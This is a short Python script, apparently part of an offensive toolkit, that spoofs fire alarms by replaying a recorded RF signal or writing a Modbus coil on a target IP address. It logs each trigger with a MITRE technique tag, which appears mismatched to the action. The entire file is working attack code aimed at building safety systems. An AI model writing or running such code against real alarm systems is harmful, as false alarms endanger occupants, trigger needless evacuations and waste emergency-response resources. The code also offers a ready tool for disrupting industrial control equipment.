#!/usr/bin/env python3
# modules/attacks/fire_alarm_spoofer.py

import os
import time
import json
import argparse
from datetime import datetime
from subprocess import run

LOG_FILE = "results/fire_alarm_spoof_log.json"
MITRE_TTP = "T1548.003"

def log_event(method, target):
    os.makedirs("results", exist_ok=True)
    event = {
        "timestamp": datetime.utcnow().isoformat(),
        "method": method,
        "target": target,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(event) + "\n")

def spoof_rf_alarm(signal_file):
    print(f"[+] Replaying fire alarm RF signal from {signal_file}")
    run(["flipper-send", signal_file])  # Replace with real RF replay command
    log_event("RF Spoof", signal_file)

def modbus_alarm_trigger(ip, coil=0x01):
    print(f"[+] Sending Modbus trigger to {ip}")
    try:
        from pymodbus.client import ModbusTcpClient
        client = ModbusTcpClient(ip)
        client.write_coil(coil, True)
        client.close()
        log_event("Modbus Trigger", ip)
        print("[✓] Fire alarm triggered via Modbus.")
    except Exception as e:
        print(f"[!] Modbus trigger failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spoof fire alarm triggers over RF or Modbus")
    parser.add_argument("--method", choices=["rf", "modbus"], required=True)
    parser.add_argument("--target", required=True, help="IP or RF file path")
    args = parser.parse_args()

    if args.method == "rf":
        spoof_rf_alarm(args.target)
    else:
        modbus_alarm_trigger(args.target)
